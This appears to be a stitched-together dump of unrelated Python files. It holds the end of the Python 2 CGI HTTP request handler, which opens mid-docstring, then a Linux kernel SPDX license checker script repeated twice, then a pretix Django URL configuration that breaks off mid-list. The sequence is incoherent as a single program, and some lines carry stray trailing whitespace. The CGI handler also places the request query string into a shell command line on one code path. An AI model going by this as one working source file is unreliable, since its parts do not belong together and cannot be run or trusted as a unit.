Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ "preferred", "other", "exceptions" ]                    
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith("License-Text:"):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find("SPDX-License-Identifier:") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \"'):
                    expr = expr.rstrip('\"').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith("LICENSES"):
            continue
        if el.path.find("license-rules.rst") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use "-"')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input "-" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ "preferred", "other", "exceptions" ]                    
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith("License-Text:"):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find("SPDX-License-Identifier:") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \"'):
                    expr = expr.rstrip('\"').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith("LICENSES"):
            continue
        if el.path.find("license-rules.rst") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use "-"')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input "-" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

from django.conf.urls import include, url

from pretix.control.views import (
    attendees, auth, dashboards, event, help, item, main, orders, organizer,
    user, vouchers,
)

urlpatterns = [
    url(r'^logout$', auth.logout, name='auth.logout'),
    url(r'^login$', auth.login, name='auth.login'),
    url(r'^register$', auth.register, name='auth.register'),
    url(r'^forgot$', auth.Forgot.as_view(), name='auth.forgot'),
    url(r'^forgot/recover$', auth.Recover.as_view(), name='auth.forgot.recover'),
    url(r'^$', dashboards.user_index, name='index'),
    url(r'^settings$', user.UserSettings.as_view(), name='user.settings'),
    url(r'^organizers/$', organizer.OrganizerList.as_view(), name='organizers'),
    url(r'^organizers/add$', organizer.OrganizerCreate.as_view(), name='organizers.add'),
    url(r'^organizer/(?P<organizer>[^/]+)/edit$', organizer.OrganizerUpdate.as_view(), name='organizer.edit'),
    url(r'^events/$', main.EventList.as_view(), name='events'),
    url(r'^events/add$', main.EventCreateStart.as_view(), name='events.add'),
    url(r'^event/(?P<organizer>[^/]+)/add', main.EventCreate.as_view(), name='events.create'),
    url(r'^event/(?P<organizer>[^/]+)/(?P<event>[^/]+)/', include([
        url(r'^$', dashboards.event_index, name='event.index'),
        url(r'^live/$', event.EventLive.as_view(), name='event.live'),
        url(r'^settings/$', event.EventUpdate.as_view(), name='event.settings'),
        url(r'^settings/plugins$', event.EventPlugins.as_view(), name='event.settings.plugins'),
        url(r'^settings/permissions$', event.EventPermissions.as_view(), name='event.settings.permissions'),
        url(r'^settings/payment$', event.PaymentSettings.as_view(), name='event.settings.payment'),
        url(r'^settings/tickets$', event.TicketSettings.as_view(), name='event.settings.tickets'),
        url(r'^settings/email$', event.MailSettings.as_view(), name='event.settings.mail'),
        url(r'^settings/invoice$', event.InvoiceSettings.as_view(), name='event.settings.invoice'),
        url(r'^settings/display', event.DisplaySettings.as_view(), name='event.settings.display'),
        url(r'^items/$', item.ItemList.as_view(), name='event.items'),
        url(r'^items/add$', item.ItemCreate.as_view(), name='event.items.add'),
        url(r'^items/(?P<item>\d+)/$', item.ItemUpdateGeneral.as_view(), name='event.item'),
        url(r'^items/(?P<item>\d+)/variations$', item.ItemVariations.as_view(),
            name='event.item.variations'),
        url(r'^items/(?P<item>\d+)/up$', item.item_move_up, name='event.items.up'),
        url(r'^items/(?P<item>\d+)/down$', item.item_move_down, name='event.items.down'),
        url(r'^items/(?P<item>\d+)/delete$', item.ItemDelete.as_view(), name='event.items.delete'),
        url(r'^categories/$', item.CategoryList.as_view(), name='event.items.categories'),
        url(r'^categories/(?P<category>\d+)/delete$', item.CategoryDelete.as_view(),
            name='event.items.categories.delete'),
        url(r'^categories/(?P<category>\d+)/up$', item.category_move_up, name='event.items.categories.up'),
        url(r'^categories/(?P<category>\d+)/down$', item.category_move_down,
            name='event.items.categories.down'),
        url(r'^categories/(?P<category>\d+)/$', item.CategoryUpdate.as_view(),
            name='event.items.categories.edit'),
        url(r'^categories/add$', item.CategoryCreate.as_view(), name='event.items.categories.add'),
        url(r'^questions/$', item.QuestionList.as_view(), name='event.items.questions'),
        url(r'^questions/(?P<question>\d+)/delete$', item.QuestionDelete.as_view(),
            name='event.items.questions.delete'),
        url(r'^questions/(?P<question>\d+)/up$', item.question_move_up, name='event.items.questions.up'),
        url(r'^questions/(?P<question>\d+)/down$', item.question_move_down,
            name='event.items.questions.down'),
        url(r'^questions/(?P<question>\d+)/$', item.QuestionUpdate.as_view(),
            name='event.items.questions.edit'),
        url(r'^questions/add$', item.QuestionCreate.as_view(), name='event.items.questions.add'),
        url(r'^quotas/$', item.QuotaList.as_view(), name='event.items.quotas'),
        url(r'^quotas/(?P<quota>\d+)/$', item.QuotaUpdate.as_view(), name='event.items.quotas.edit'),
        url(r'^quotas/(?P<quota>\d+)/delete$', item.QuotaDelete.as_view(),
            name='event.items.quotas.delete'),
        url(r'^quotas/add$', item.QuotaCreate.as_view(), name='event.items.quotas.add'),
        url(r'^vouchers/$', vouchers.VoucherList.as_view(), name='event.vouchers'),
        url(r'^vouchers/tags/$', vouchers.VoucherTags.as_view(), name='event.vouchers.tags'),
        url(r'^vouchers/(?P<voucher>\d+)/$', vouchers.VoucherUpdate.as_view(), name='event.voucher'),
        url(r'^vouchers/(?P<voucher>\d+)/delete$', vouchers.VoucherDelete.as_view(),
            name='event.voucher.delete'),
        url(r'^vouchers/add$', vouchers.VoucherCreate.as_view(), name='event.vouchers.add'),
        url(r'^vouchers/bulk_add$', vouchers.VoucherBulkCreate.as_view(), name='event.vouchers.bulk'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/transition$', orders.OrderTransition.as_view(),
            name='event.order.transition'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/resend$', orders.OrderResendLink.as_view(),
            name='event.order.resendlink'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoice$', orders.OrderInvoiceCreate.as_view(),
            name='event.order.geninvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoices/(?P<id>\d+)/regenerate$', orders.OrderInvoiceRegenerate.as_view(),
            name='event.order.regeninvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/invoices/(?P<id>\d+)/reissue$', orders.OrderInvoiceReissue.as_view(),
            name='event.order.reissueinvoice'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/extend$', orders.OrderExtend.as_view(),
            name='event.order.extend'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/comment$', orders.OrderComment.as_view(),
            name='event.order.comment'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/$', orders.OrderDetail.as_view(), name='event.order'),
        url(r'^orders/(?P<code>[0-9A-Z]+)/download/(?P<output>[^/]+)$', orders.OrderDownload.as_view(),
            name='event.order.download'),
        url(r'^invoice/(?P<invoice>[^/]+)$', orders.InvoiceDownload.as_view(),
            name='event.invoice.download'),
        url(r'^orders/overview/$', orders.OverView.as_view(), name='event.orders.overview'),
        url(r'^orders/export/$', orders.ExportView.as_view(), name='event.orders.export'),
        url(r'^orders/go$', orders.OrderGo.as_view(), name='event.orders.go'),
